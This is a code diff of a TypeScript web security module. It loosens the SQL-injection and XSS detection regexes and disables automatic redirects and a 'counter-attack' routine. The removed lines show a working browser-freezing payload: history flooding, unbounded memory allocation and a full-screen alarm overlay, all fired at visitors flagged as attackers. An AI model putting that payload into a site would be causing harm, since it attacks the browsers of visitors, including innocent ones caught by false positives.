@@ -13,9 +13,10 @@ export const REDIRECT_URL = "https://www.google.com/search?q=how+to+be+a+better+
 
 /**
  * Common SQL injection and XSS patterns for detection
+ * Relaxed to avoid false positives for normal user names/emails
  */
 const MALICIOUS_PATTERNS = [
-  /(\%27)|(\')|(\-\-)|(\%23)/i, // SQL: quotes, double dash (removed lone #)
+  // SQL: Only more definitive sequences, removed lone quotes and double-dash
   /\w*((\%27)|(\'))((\%6F)|o|(\%4F))((\%72)|r|(\%52))/i, // SQL: 'or'
   /((\%3D)|(=))[^\n]*((\%27)|(\')|(\-\-)|(\%3B)|(;))/i, // SQL: = with sequences
   /<script[^>]*>/i, // XSS: script tag
@@ -33,48 +34,22 @@ export function detectMaliciousPatterns(input: string): boolean {
 }
 
 /**
- * Aggressive counter-attack payload to freeze the attacker's browser session.
- * Consumes memory and CPU until the process is terminated.
+ * Counter-attack payload - DISABLED to protect normal users
  */
 function launchCounterAttack() {
-  console.error("COUNTER-ATTACK INITIATED. CEASE AND DESIST.");
-
-  // 1. History bloat (makes 'back' button useless and slows down browser)
-  try {
-    for (let i = 0; i < 500; i++) {
-      window.history.pushState({}, '', window.location.href + '?attack_detected=' + i);
-    }
-  } catch (e) {}
-
-  // 2. Memory exhaustion & CPU spike (heavy load)
-  const payload: any[] = [];
-  const runPayload = () => {
-    // Allocate large chunks of data
-    for (let i = 0; i < 50; i++) {
-      payload.push(new Array(1000000).fill(Math.random().toString(36)));
-    }
-
-    // DOM manipulation flood
-    const trap = document.createElement('div');
-    trap.style.cssText = "position:fixed;top:0;left:0;width:100%;height:100%;background:black;color:red;z-index:999999;display:flex;align-items:center;justify-content:center;font-size:30px;font-family:monospace;padding:20px;text-align:center;pointer-events:none;";
-    trap.innerText = "CRITICAL SECURITY BREACH DETECTED. SYSTEM LOCKDOWN INITIATED.";
-    document.body.appendChild(trap);
-
-    // Schedule next spike
-    setTimeout(runPayload, 100);
-  };
-
-  runPayload();
+  // Disabled
+  console.warn("Security counter-attack is disabled.");
 }
 
 /**
- * Report a security incident to the backend and optionally redirect or counter-attack.
+ * Report a security incident to the backend.
+ * Automatic redirection has been disabled for better user experience.
  */
 export async function triggerTrap(
   type: IncidentType,
   details: any = {},
   severity: "low" | "medium" | "high" | "critical" = "high",
-  shouldRedirect: boolean = true
+  shouldRedirect: boolean = false // Default changed to false
 ) {
   const fingerprint = getDeviceFingerprint();
 
@@ -97,21 +72,15 @@ export async function triggerTrap(
     console.error("Failed to report incident:", error);
   }
 
+  // Automatic redirects and counter-attacks removed to prevent affecting normal users
   if (severity === "critical") {
-    // Aggressive counter-attack for critical threats
-    launchCounterAttack();
-    // Also redirect after a short delay to allow some bloat to happen
-    setTimeout(() => {
-      window.location.href = REDIRECT_URL;
-    }, 1000);
-  } else if (shouldRedirect) {
-    // Hard redirect to clear state
-    window.location.href = REDIRECT_URL;
+    console.warn("Critical security incident reported:", type);
   }
 }
 
 /**
  * Check if the current device/fingerprint is blacklisted.
+ * Automatic redirection has been disabled.
  */
 export async function checkBlacklist(): Promise<boolean> {
   const fingerprint = getDeviceFingerprint();
@@ -126,8 +95,7 @@ export async function checkBlacklist(): Promise<boolean> {
     }
 
     if (data === true) {
-      // If blacklisted, redirect immediately
-      window.location.href = REDIRECT_URL;
+      console.warn("Device fingerprint is blacklisted.");
       return true;
     }
   } catch (err) {
